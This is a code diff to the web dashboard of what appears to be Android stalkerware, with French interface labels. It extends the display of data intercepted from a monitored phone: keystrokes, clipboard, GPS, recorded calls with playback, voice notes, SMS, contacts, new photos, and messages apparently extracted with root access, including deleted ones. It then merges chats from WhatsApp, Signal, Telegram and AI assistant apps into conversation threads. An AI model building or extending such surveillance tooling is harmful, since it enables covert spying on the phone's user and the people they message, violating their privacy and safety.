@@ -113,18 +113,49 @@ function isPrivate(e){return e.payload?.private===true;}
 const TYPE_LABELS={
   heartbeat:'Heartbeat',browser:'Nav. intégré',device_info:'Infos appareil',
   app_opened:'App ouverte',app_closed:'App fermée',app_focus:'App active',
-  apps_installed:'Apps installées',
+  apps_installed:'Apps installées',app_usage:'Usage apps',
   safari_page:'Safari Page',safari_search:'Safari Recherche',safari_form:'Safari Form',safari_text:'Safari Texte',
   chrome_page:'Chrome Page',chrome_search:'Chrome Recherche',chrome_form:'Chrome Form',chrome_text:'Chrome Texte',
   chrome_download:'Téléchargement',
-  network_traffic:'Trafic réseau',location:'GPS',app_installed:'App installée',app_removed:'App supprimée',
+  network_traffic:'Trafic réseau',location:'📍 GPS',app_installed:'App installée',app_removed:'App supprimée',
   photo_captured:'📷 Photo capturée',take_photo:'Photo demandée',
-  notification_message:'💬 Notification',
+  notification_message:'💬 Message',
+  voice_message:'🎤 Vocal',
+  voice_note_captured:'🎤 Vocal capturé',
+  call_recording:'🔴 Appel enregistré',
+  root_message:'🔓 Message (root)',
+  sms_message:'📱 SMS',
+  contacts_sync:'👥 Contacts',
+  new_photo_detected:'📷 Nouvelle photo',
+  new_video_detected:'🎬 Nouvelle vidéo',
+  screenshot:'📸 Screenshot',
+  whatsapp_contacts:'👥 Contacts WhatsApp',
+  whatsapp_media_files:'📁 Média WhatsApp',
+  root_device_info:'🔓 Infos root',
   keystroke:'⌨️ Texte tapé',
   clipboard:'📋 Presse-papiers',
   phone_call:'📞 Appel',
   device_boot:'🔄 Redémarrage',
 };
+
+const PACKAGE_NAMES={
+  'com.whatsapp':'WhatsApp','com.whatsapp.w4b':'WhatsApp Business',
+  'org.telegram.messenger':'Telegram','com.facebook.orca':'Messenger',
+  'com.instagram.android':'Instagram','com.snapchat.android':'Snapchat',
+  'org.thoughtcrime.securesms':'Signal','com.google.android.apps.messaging':'Messages',
+  'com.samsung.android.messaging':'Samsung Messages','com.android.mms':'SMS',
+  'com.slack':'Slack','com.microsoft.teams':'Teams','com.discord':'Discord',
+  'com.skype.raider':'Skype','com.viber.voip':'Viber',
+  'com.openai.chatgpt':'ChatGPT','com.google.android.apps.bard':'Gemini',
+  'com.anthropic.claude':'Claude','com.tencent.mm':'WeChat',
+  'jp.naver.line.android':'Line','com.imo.android.imoim':'Imo',
+  'com.google.android.gm':'Gmail','com.microsoft.office.outlook':'Outlook',
+  'com.google.android.youtube':'YouTube','com.android.chrome':'Chrome',
+  'com.google.android.dialer':'Téléphone','com.google.android.contacts':'Contacts',
+  'com.google.android.apps.photos':'Google Photos','com.android.settings':'Paramètres',
+  'com.google.android.apps.maps':'Google Maps','com.google.android.calendar':'Agenda',
+};
+function readableAppName(pkg){return PACKAGE_NAMES[pkg]||pkg?.split('.').pop()||pkg||'App';}
 
 const SOURCE_LABELS={auto:'Auto-capturée',command:'Demandée',gallery:'Galerie'};
 const APP_LABELS={whatsapp:'WhatsApp',telegram:'Telegram',signal:'Signal',snapchat:'Snapchat',
@@ -147,16 +178,22 @@ function eventDetail(e){
   // Android : notifications (WhatsApp, SMS, Telegram, etc.)
   if(e.type==='notification_message'){
     const appIcon=APP_ICONS[p.app?.toLowerCase()]||'💬';
-    const appLabel=esc(p.app||p.packageName||'App');
+    const appLabel=esc(p.app||readableAppName(p.packageName));
     return`${appIcon} <strong>${appLabel}</strong> — ${esc(p.sender||'')}: <em>"${esc((p.message||'').slice(0,200))}"</em>`;
+  }
+  // Android : messages vocaux
+  if(e.type==='voice_message'){
+    const appIcon=APP_ICONS[p.app?.toLowerCase()]||'🎤';
+    const appLabel=esc(p.app||readableAppName(p.packageName));
+    return`🎤 <strong>${appLabel}</strong> — ${esc(p.sender||'')}: <em style="color:#f59e0b">Message vocal</em>`;
   }
   // Android : texte tapé au clavier
   if(e.type==='keystroke'){
-    const appName=esc(p.app||'');
+    const appName=esc(readableAppName(p.app));
     return`⌨️ <strong>${appName}</strong> — <em>"${esc((p.text||'').slice(0,300))}"</em>`;
   }
   // Android : app active
-  if(e.type==='app_focus')return`📱 ${esc(p.app||'')}`;
+  if(e.type==='app_focus')return`📱 ${esc(readableAppName(p.app))}`;
   // Android : apps installées
   if(e.type==='apps_installed')return`${p.count||0} apps installées`;
   // Appels téléphoniques
@@ -167,7 +204,33 @@ function eventDetail(e){
     const name=p.contact?`<strong>${esc(p.contact)}</strong> — `:'';
     return`${icon} ${esc(p.type||'')} — ${name}${esc(p.number||'inconnu')}${dur}`;
   }
-  if(e.type==='device_boot')return'Appareil redémarre';
+  if(e.type==='device_boot')return'Appareil redémarré';
+  if(e.type==='voice_note_captured'){
+    const dur=p.durationSeconds||p.durationEstimate||'?';
+    const appName=esc(p.app||'');
+    const player=p.audioId?`<audio controls preload="none" src="/api/audio/${p.audioId}/stream" style="height:28px;vertical-align:middle;margin-left:6px"></audio>`:'';
+    return`🎤 <strong>${appName}</strong> — ${esc(p.sender||'')} — Vocal ${dur}s ${p.isOutgoing?'(envoyé)':'(reçu)'}${player}`;
+  }
+  if(e.type==='call_recording'){
+    const dur=p.durationSeconds||'?';
+    const player=p.audioId?`<audio controls preload="none" src="/api/audio/${p.audioId}/stream" style="height:28px;vertical-align:middle;margin-left:6px"></audio>`:'';
+    return`🔴 <strong>Appel enregistré</strong> — ${esc(p.number||'')} — ${dur}s ${p.isOutgoing?'(sortant)':'(entrant)'}${player}`;
+  }
+  if(e.type==='root_message'){
+    const dir=p.isOutgoing?'→':'←';
+    const del=p.isDeleted?' <span style="color:var(--danger)">[supprimé]</span>':'';
+    const fwd=p.isForwarded?' <span style="color:var(--text-dim)">[transféré]</span>':'';
+    return`🔓 <strong>${esc(p.app||'')}</strong> ${dir} ${esc(p.sender||'')}: <em>"${esc((p.message||'').slice(0,300))}"</em>${del}${fwd}`;
+  }
+  if(e.type==='sms_message'){
+    return`📱 <strong>SMS ${esc(p.type||'')}</strong> — ${esc(p.contact||p.address||'')}: <em>"${esc((p.body||'').slice(0,200))}"</em>`;
+  }
+  if(e.type==='contacts_sync')return`👥 ${p.count||0} contacts synchronisés`;
+  if(e.type==='new_photo_detected'){
+    const src=p.sourceApp||'galerie';
+    return`📷 Nouvelle photo : <strong>${esc(p.filename||'')}</strong> (${src}) ${p.isScreenshot?'— Screenshot':''}`;
+  }
+  if(e.type==='new_video_detected')return`🎬 Nouvelle vidéo : <strong>${esc(p.filename||'')}</strong> (${p.sizeMB||'?'} Mo, ${p.durationSeconds||'?'}s)`;
   // Clipboard
   if(e.type==='clipboard')return`📋 <em>"${esc((p.text||'').slice(0,200))}"</em> (${p.length||0} car.)`;
   // Photo
@@ -390,41 +453,161 @@ function renderMessagesPage(){
   renderClipboardLog(evts);
 }
 
-// --- Conversations groupees par contact/app ---
+// --- Conversations UNIFIEES par contact/app ---
+// Fusionne messages texte, vocaux, appels, médias dans un seul fil chronologique
 function renderConversations(evts){
-  const msgs=evts.filter(e=>e.type==='notification_message');
+  const relevantTypes=['notification_message','voice_message','voice_note_captured',
+    'root_message','phone_call','call_recording','sms_message','new_photo_detected'];
+  const msgs=evts.filter(e=>relevantTypes.includes(e.type));
   const el=document.getElementById('conversations-list');
   if(!msgs.length){el.innerHTML='<p class="empty">Aucune conversation captee. Les notifications WhatsApp/SMS apparaitront ici.</p>';return;}
 
+  // Regrouper par contact/numéro (intelligent : même numéro = même conversation)
   const groups={};
   msgs.forEach(m=>{
     const p=m.payload||{};
-    const app=p.app||p.packageName||'App';
-    const sender=p.sender||'Inconnu';
-    const key=`${app}|||${sender}`;
-    if(!groups[key])groups[key]={app,sender,messages:[]};
-    groups[key].messages.push({text:p.message||p.text||'',time:m.receivedAt,device:m.deviceId});
+    const app=p.app||readableAppName(p.packageName);
+    const sender=p.sender||p.number||p.address||'Inconnu';
+    const group=p.group||p.groupName||'';
+    const key=group?`${app}|||${group}`:`${app}|||${sender}`;
+    const label=group||p.contact||sender;
+    if(!groups[key])groups[key]={app,label,isGroup:!!group,items:[],lastTime:m.receivedAt,senders:new Set()};
+    groups[key].senders.add(sender);
+
+    const item={
+      type:m.type,
+      text:p.message||p.text||p.body||'',
+      sender:p.contact||sender,
+      time:m.receivedAt,
+      device:m.deviceId,
+      isOutgoing:!!p.isOutgoing||!!p.key_from_me,
+      isVoice:m.type==='voice_message'||m.type==='voice_note_captured'||p.isVoiceMessage,
+      isCall:m.type==='phone_call'||m.type==='call_recording',
+      isMedia:!!p.isMedia||m.type==='new_photo_detected',
+      isDeleted:!!p.isDeleted,
+      isForwarded:!!p.isForwarded,
+      callType:p.type||'',
+      duration:p.durationSeconds||p.durationEstimate||p.mediaDuration||0,
+      mediaType:p.mediaType||'',
+      audioId:p.audioId||null,
+      quotedMessage:p.quotedMessage||null,
+      source:p.source||'',
+    };
+    groups[key].items.push(item);
+    if(m.receivedAt>groups[key].lastTime)groups[key].lastTime=m.receivedAt;
   });
 
-  const appIcons={WhatsApp:'💬','WhatsApp Business':'💼',Telegram:'✈️',Messenger:'💬',Instagram:'📸',Signal:'🔒',SMS:'📱',Messages:'📱','Samsung Messages':'📱',Slack:'💼',Teams:'💼',Discord:'🎮',Snapchat:'👻',Viber:'📞'};
+  const appIcons={WhatsApp:'💬','WhatsApp Business':'💼',Telegram:'✈️',Messenger:'💬',Instagram:'📸',Signal:'🔒',SMS:'📱',Messages:'📱','Samsung Messages':'📱',Slack:'💼',Teams:'💼',Discord:'🎮',Snapchat:'👻',Viber:'📞',ChatGPT:'🤖',Gemini:'✨',Claude:'🤖'};
+  const appColors={WhatsApp:'#25d366','WhatsApp Business':'#25d366',Telegram:'#0088cc',Messenger:'#0084ff',Instagram:'#e1306c',Signal:'#3a76f0',SMS:'#3b82f6',Messages:'#3b82f6',Slack:'#4a154b',Teams:'#6264a7',Discord:'#5865f2',Snapchat:'#fffc00',Viber:'#7360f2',ChatGPT:'#10a37f',Gemini:'#4285f4',Claude:'#d4a574'};
 
-  el.innerHTML=Object.values(groups).sort((a,b)=>b.messages.length-a.messages.length).map(g=>{
+  const sorted=Object.values(groups).sort((a,b)=>new Date(b.lastTime)-new Date(a.lastTime));
+
+  el.innerHTML=sorted.map(g=>{
     const icon=appIcons[g.app]||'💬';
-    const msgsHtml=g.messages.slice(0,20).map(m=>`
-      <div class="conv-msg">
-        <div class="conv-msg-text">${esc(m.text)}</div>
-        <div class="conv-msg-time">${fmtTime(m.time)} — ${esc(deviceName(m.device))}</div>
-      </div>`).join('');
-    return`<div class="conv-group">
-      <div class="conv-header">
-        <span class="conv-app-icon">${icon}</span>
-        <span class="conv-app-name">${esc(g.app)}</span>
-        <span class="conv-contact">${esc(g.sender)}</span>
-        <span class="conv-count">${g.messages.length} msg</span>
+    const color=appColors[g.app]||'#3b82f6';
+    const totalItems=g.items.length;
+    const lastItem=g.items[g.items.length-1];
+
+    // Aperçu du dernier message
+    let lastPreview='';
+    if(lastItem.isVoice)lastPreview='🎤 Message vocal';
+    else if(lastItem.isCall)lastPreview=`📞 Appel ${lastItem.callType}`;
+    else if(lastItem.isMedia)lastPreview='📷 Photo';
+    else lastPreview=lastItem.text.slice(0,60)+(lastItem.text.length>60?'…':'');
+
+    const voiceCount=g.items.filter(i=>i.isVoice).length;
+    const callCount=g.items.filter(i=>i.isCall).length;
+    const rootTag=g.items.some(i=>i.source==='root_db')?'<span class="conv-root-badge">ROOT</span>':'';
+
+    // Rendu des items du fil
+    const itemsHtml=g.items.slice(-50).map(i=>renderConvItem(i,g.isGroup)).join('');
+
+    return`<div class="conv-card">
+      <div class="conv-card-header" onclick="this.parentElement.classList.toggle('open')">
+        <div class="conv-card-avatar" style="background:${color}">${icon}</div>
+        <div class="conv-card-info">
+          <div class="conv-card-top">
+            <span class="conv-card-name">${esc(g.label)}</span>
+            ${rootTag}
+            <span class="conv-card-time">${shortTime(g.lastTime)}</span>
+          </div>
+          <div class="conv-card-bottom">
+            <span class="conv-card-app">${esc(g.app)}</span>
+            <span class="conv-card-preview">${esc(lastPreview)}</span>
+            ${voiceCount?`<span class="conv-voice-badge">🎤 ${voiceCount}</span>`:''}
+            ${callCount?`<span class="conv-voice-badge">📞 ${callCount}</span>`:''}
+            <span class="conv-card-badge">${totalItems}</span>
+          </div>
+        </div>
       </div>
-      ${msgsHtml}
+      <div class="conv-card-messages">${itemsHtml}</div>
     </div>`;
   }).join('');
+}
+
+function renderConvItem(item,isGroup){
+  const dirClass=item.isOutgoing?'conv-bubble-out':'conv-bubble-in';
+  const timeStr=shortTime(item.time);
+
+  // Message supprimé
+  if(item.isDeleted){
+    return`<div class="conv-bubble ${dirClass} deleted-bubble">
+      ${isGroup&&!item.isOutgoing?`<div class="conv-bubble-sender">${esc(item.sender)}</div>`:''}
+      <div class="conv-bubble-text deleted-text">🚫 Ce message a été supprimé</div>
+      <div class="conv-bubble-time">${timeStr}</div>
+    </div>`;
+  }
+
+  // Appel téléphonique
+  if(item.isCall){
+    const callIcons={entrant:'📲',sortant:'📱',manque:'❌',rejete:'🚫'};
+    const ci=callIcons[item.callType]||'📞';
+    const dur=item.duration>0?` · ${Math.floor(item.duration/60)}min ${item.duration%60}s`:'';
+    const hasRecording=item.audioId?`<div class="conv-audio-player"><audio controls preload="none" src="/api/audio/${item.audioId}/stream"></audio><span class="conv-audio-label">Enregistrement de l'appel</span></div>`:'';
+    return`<div class="conv-bubble conv-bubble-call">
+      <div class="conv-bubble-call-info">${ci} <strong>Appel ${esc(item.callType)}</strong>${dur}</div>
+      ${hasRecording}
+      <div class="conv-bubble-time">${timeStr}</div>
+    </div>`;
+  }
+
+  // Message vocal (avec ou sans audio écoutable)
+  if(item.isVoice){
+    const durText=item.duration>0?`${item.duration}s`:'';
+    const playerHtml=item.audioId
+      ?`<div class="conv-audio-player"><audio controls preload="none" src="/api/audio/${item.audioId}/stream"></audio></div>`
+      :`<div class="conv-audio-wave">🎤 ${durText?'Vocal '+durText:'Message vocal'}</div>`;
+    return`<div class="conv-bubble ${dirClass} voice-bubble">
+      ${isGroup&&!item.isOutgoing?`<div class="conv-bubble-sender">${esc(item.sender)}</div>`:''}
+      ${playerHtml}
+      <div class="conv-bubble-time">${item.isOutgoing?'Envoyé':'Reçu'} · ${timeStr}</div>
+    </div>`;
+  }
+
+  // Photo / média
+  if(item.isMedia&&!item.text){
+    const mediaIcons={image:'📷',video:'🎬',document:'📄',location:'📍',sticker:'🏷️',gif:'🎞️',contact:'👤',voice_note:'🎤'};
+    const mi=mediaIcons[item.mediaType]||'📎';
+    return`<div class="conv-bubble ${dirClass} media-bubble">
+      ${isGroup&&!item.isOutgoing?`<div class="conv-bubble-sender">${esc(item.sender)}</div>`:''}
+      <div class="conv-bubble-media">${mi} ${esc(item.mediaType||'Média')}</div>
+      <div class="conv-bubble-time">${item.isOutgoing?'Envoyé':'Reçu'} · ${timeStr}</div>
+    </div>`;
+  }
+
+  // Message transféré
+  const fwdTag=item.isForwarded?'<div class="conv-forwarded">↗️ Transféré</div>':'';
+
+  // Message cité
+  const quoteHtml=item.quotedMessage?`<div class="conv-quoted">${esc(item.quotedMessage)}</div>`:'';
+
+  // Message texte normal
+  return`<div class="conv-bubble ${dirClass}">
+    ${isGroup&&!item.isOutgoing?`<div class="conv-bubble-sender">${esc(item.sender)}</div>`:''}
+    ${fwdTag}${quoteHtml}
+    <div class="conv-bubble-text">${esc(item.text)}</div>
+    <div class="conv-bubble-time">${item.isOutgoing?'Envoyé':'Reçu'} · ${timeStr}</div>
+  </div>`;
 }
 
 // --- Texte tape (reconstruit intelligemment) ---
@@ -433,7 +616,6 @@ function renderTypedTexts(evts){
   const el=document.getElementById('typed-list');
   if(!keystrokes.length){el.innerHTML='<p class="empty">Aucun texte capture. Le texte tape au clavier apparaitra ici.</p>';return;}
 
-  // Grouper par app et par fenetre de temps (5 min)
   const blocks=[];
   let current=null;
   keystrokes.sort((a,b)=>new Date(a.receivedAt)-new Date(b.receivedAt)).forEach(e=>{
@@ -454,8 +636,9 @@ function renderTypedTexts(evts){
 
   el.innerHTML=blocks.reverse().slice(0,50).map(b=>{
     const combinedText=b.texts[b.texts.length-1];
+    const appLabel=readableAppName(b.app);
     return`<div class="typed-block">
-      <div class="typed-app">📱 ${esc(b.app)} — ${esc(deviceName(b.device))}</div>
+      <div class="typed-app">⌨️ <strong>${esc(appLabel)}</strong> — ${esc(deviceName(b.device))}</div>
       <div class="typed-text">${esc(combinedText)}</div>
       <div class="typed-time">${fmtTime(b.startTime)}</div>
     </div>`;
@@ -506,9 +689,10 @@ function renderAppUsage(evts){
 
   const sorted=Object.entries(appCounts).sort((a,b)=>b[1].count-a[1].count);
   el.innerHTML=sorted.slice(0,30).map(([app,data])=>{
-    const shortName=app.split('.').pop();
+    const label=readableAppName(app);
+    const isKnown=PACKAGE_NAMES[app];
     return`<div class="app-row">
-      <span class="app-name">${esc(shortName)} <span style="color:var(--text-dim);font-weight:400;font-size:0.7rem">${esc(app)}</span></span>
+      <span class="app-name">${esc(label)}${!isKnown?` <span style="color:var(--text-dim);font-weight:400;font-size:0.65rem">${esc(app)}</span>`:''}</span>
       <span style="font-weight:600">${data.count}x</span>
       <span class="app-time-ago">${fmtTime(data.last)}</span>
     </div>`;
